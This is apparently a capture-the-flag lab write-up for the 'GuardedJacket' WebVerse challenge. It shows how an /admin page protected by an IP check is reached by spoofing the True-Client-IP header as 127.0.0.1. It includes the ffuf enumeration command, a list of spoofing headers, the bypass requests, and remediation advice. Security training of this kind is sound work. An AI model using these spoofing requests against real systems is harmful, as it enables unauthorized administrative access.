# GuardedJacket

### Lab Link
[WebVerse - GuardedJacket](https://dashboard.webverselabs-pro.com/events/guardedjacket)

---

### Overview

- Vulnerability Type: Access Control Bypass via Client IP Spoofing
- Affected Endpoint: `/admin`
- Security Mechanism: IP-Based Access Restriction
- Vulnerable Header: `True-Client-IP`
- Impact: Unauthorized Access to Administrative Functionality

---

### Vulnerability Discovery

During the reconnaissance phase, endpoint mapping and content discovery were performed to identify potentially sensitive functionality exposed by the application.

Using common enumeration techniques and wordlists, several application routes were analyzed. While most endpoints behaved as expected, one particular endpoint stood out:

```http
/admin
```

Attempting to access the endpoint directly returned a `403 Forbidden` response, suggesting that access controls were in place.

Because administrative interfaces are frequently protected using network-based restrictions, further testing was conducted to determine whether the application relied on HTTP headers to identify trusted clients.

---

### Reconnaissance & Enumeration

Basic endpoint discovery revealed the existence of an administrative panel.

Example discovery request:

```bash
ffuf -u https://LAB-ID.webverselabs-pro.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 404
```

Response:

```http
/admin    [Status: 403]
```

The endpoint was reachable but access was denied.

At this point, the objective shifted from discovery to identifying the mechanism responsible for the restriction.

---

### Access Control Analysis

The application's behavior suggested that requests originating from trusted sources may be granted access to the administrative resource.

Several commonly trusted proxy-related headers were reviewed and tested.

One of these headers was:

```http
True-Client-IP
```

By manually supplying a localhost IP address within the header, the application's response changed significantly.

---

### Source-to-Sink Analysis

#### Source

User-controlled HTTP header:

```http
True-Client-IP: 127.0.0.1
```

#### Sink

Backend authorization logic responsible for determining whether access to the `/admin` endpoint should be granted.

The application appeared to trust the value supplied in the `True-Client-IP` header without validating whether the request actually originated from a trusted proxy.

As a result, an external attacker could impersonate localhost and bypass the intended access restrictions.

---

### Proof of Concept (PoC)

The following steps demonstrate how an attacker can bypass the application's access controls and obtain unauthorized access to the administrative interface.

#### Step 1 - Access Restricted Endpoint

Request:

```http
GET /admin HTTP/1.1
Host: target-site
```

Response:

```http
HTTP/1.1 403 Forbidden
```

The application correctly denies access.

---

#### Step 2 - Test Common IP Spoofing Headers

Since the endpoint appeared to enforce IP-based restrictions, several commonly trusted proxy and client IP headers were tested to determine whether the application relied on any user-supplied values for authorization decisions.

The following headers were evaluated:

```http
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

Each header was tested individually while requesting the restricted administrative endpoint.

During testing, it was observed that the application continued returning a `403 Forbidden` response for most headers. However, when the `True-Client-IP` header was supplied with the localhost address (`127.0.0.1`), the application's behavior changed and access to the restricted resource was granted.

#### Successful Bypass Request

```http
GET /admin HTTP/1.1
Host: target-site
True-Client-IP: 127.0.0.1
```

---

#### Step 3 - Observe Access Control Bypass

Response:

```http
HTTP/1.1 200 OK
```

The application now treats the request as if it originated from localhost and grants access to the protected administrative functionality.

---

#### Vulnerable Request

```http
GET /admin HTTP/1.1
Host: target-site
True-Client-IP: 127.0.0.1
User-Agent: Mozilla/5.0
```

#### Expected Behavior

The application should ignore externally supplied IP-related headers and continue enforcing its access restrictions.

Expected response:

```http
HTTP/1.1 403 Forbidden
```

#### Actual Behavior

The application trusts the attacker-controlled `True-Client-IP` header value and allows access when `127.0.0.1` is provided.

Actual response:

```http
HTTP/1.1 200 OK
```

---

#### Impact Validation

After bypassing the restriction, the administrative interface became accessible.

Sensitive content intended only for privileged users was exposed, allowing successful retrieval of the challenge flag and confirming the vulnerability's impact.

---

### Root Cause

The application makes authorization decisions based on the value of the `True-Client-IP` header.

Because this header can be supplied by an attacker, it must not be trusted unless a properly configured reverse proxy sanitizes and populates it.

The absence of proper validation allows any external user to impersonate trusted internal addresses.

Example:

```http
True-Client-IP: 127.0.0.1
```

This results in incorrect authorization decisions and unauthorized access to protected functionality.

---

### Security Impact

An attacker can:

- Bypass IP-based access restrictions.
- Gain unauthorized access to administrative interfaces.
- View privileged or sensitive information.
- Potentially perform administrative actions.
- Circumvent security assumptions based on source IP trust.

---

### Remediation

The application should never rely on user-controlled headers for security-critical authorization decisions.

Recommended mitigations:

- Trust IP-related headers only when inserted by trusted reverse proxies.
- Strip externally supplied `True-Client-IP` headers.
- Validate requests through a trusted proxy chain.
- Implement authentication and authorization mechanisms independent of source IP.
- Restrict administrative functionality using proper user authentication controls.

---

### Conclusion

During routine reconnaissance and endpoint mapping, a restricted administrative endpoint (`/admin`) was discovered. Initial requests returned a `403 Forbidden` response, indicating the presence of access controls.

Further testing revealed that the application trusted the user-supplied `True-Client-IP` header when making authorization decisions. By spoofing the header with the localhost address (`127.0.0.1`), the application incorrectly identified the request as originating from a trusted internal source and granted access to the administrative interface.

This vulnerability resulted in a complete bypass of the intended access restrictions and allowed successful retrieval of the challenge flag.

**Flag Captured ✅**